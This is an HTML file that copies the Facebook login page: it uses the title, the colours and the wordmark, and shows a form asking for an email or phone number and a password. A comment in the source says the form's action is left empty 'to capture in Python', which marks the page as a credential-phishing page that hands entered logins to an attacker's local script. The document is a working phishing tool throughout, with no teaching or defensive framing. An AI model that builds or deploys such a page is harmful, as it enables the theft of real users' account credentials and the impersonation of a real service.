<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta 
  name="viewport" 
  content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
>
<title>
  Facebook – log in or sign up
</title>
<script src="https://cdn.tailwindcss.com">
</script>
<style>
body {
  background-color: #f0f2f5;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  margin: 0;
  padding: 0;
}
.header-v {
  margin-top: 40px;
  margin-bottom: 20px;
}
.card-v {
  background-color: #ffffff;
  padding: 16px;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
  width: 90%;
  max-width: 400px;
  text-align: center;
}
.input-v {
  width: 100%;
  padding: 14px 16px;
  margin-bottom: 12px;
  border: 1px solid #dddfe2;
  border-radius: 6px;
  font-size: 17px;
  box-sizing: border-box;
  outline-color: #1877f2;
}
.btn-login-v {
  background-color: #1877f2;
  color: #ffffff;
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 6px;
  font-size: 20px;
  font-weight: 700;
  cursor: pointer;
  margin-top: 4px;
}
.btn-create-v {
  background-color: #42b72a;
  color: #ffffff;
  width: auto;
  padding: 0 16px;
  border: none;
  border-radius: 6px;
  font-size: 17px;
  font-weight: 700;
  line-height: 48px;
  display: inline-block;
  text-decoration: none;
  margin-top: 20px;
}
.footer-links-v {
  color: #1877f2;
  font-size: 14px;
  text-decoration: none;
  display: block;
  margin-top: 16px;
}
</style>
</head>
<body>
<div class="header-v">
  <h1 
    style="color: #1877f2; font-size: 50px; font-weight: 800; letter-spacing: -2px;"
  >
    facebook
  </h1>
</div>
<div class="card-v">
  <!-- ACTION IS EMPTY TO CAPTURE IN PYTHON -->
  <form 
    action="" 
    method="POST"
  >
    <input 
      name="user" 
      type="text" 
      class="input-v" 
      placeholder="Mobile number or email address" 
      required
    >
    <input 
      name="pass" 
      type="password" 
      class="input-v" 
      placeholder="Password" 
      required
    >
    <button 
      type="submit" 
      class="btn-login-v"
    >
      Log In
    </button>
    <a 
      href="#" 
      class="footer-links-v"
    >
      Forgotten password?
    </a>
    <div 
      style="border-bottom: 1px solid #dadde1; margin: 20px 0;"
    >
    </div>
    <a 
      href="#" 
      class="btn-create-v"
    >
      Create new account
    </a>
  </form>
</div>
<div 
  style="margin-top: 30px; text-align: center; color: #1c1e21; font-size: 14px;"
>
  <p>
    <b>Create a Page</b> for a celebrity, brand or business.
  </p>
</div>
</body>
</html>
